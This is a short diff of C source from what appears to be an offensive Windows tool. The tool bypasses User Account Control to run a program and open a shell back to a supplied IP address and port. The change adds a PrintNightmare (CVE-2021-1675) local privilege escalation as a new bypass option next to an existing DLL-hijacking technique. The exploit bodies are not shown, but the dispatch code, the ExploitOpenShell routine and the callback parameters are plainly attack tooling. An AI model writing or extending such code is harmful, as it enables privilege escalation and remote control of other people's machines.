@@ -6,6 +6,7 @@
 #include "Message.h"
 #include "CheckSystem.h"
 #include "DllHijacking.h"
+#include "PrintNightmareLPE.h"
 
 #define MAX_CLEANUP_TRY     10
 #define SLEEP_1_SEC         1000
@@ -96,7 +97,7 @@ BOOL ExploitOpenShell(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPA
     return returnValue;
 }
 
-BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec) {
+BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
     BOOL returnValue = FALSE;
 
     if (!IsUACEnabled()) {
@@ -119,6 +120,11 @@ BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_T
 
                 printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
                 returnValue = ExploitTrustedDirectories(PathExeToRun, ipAddress, port);
+
+
+            } else if (UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
+                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'PrintNightmare LPE - (CVE-2021-1675)'\n");
+                returnValue = ExploitPrintNightmareLPE(PathExeToRun, ipAddress, port, wincatDefaultDir);
 
             } else {
 
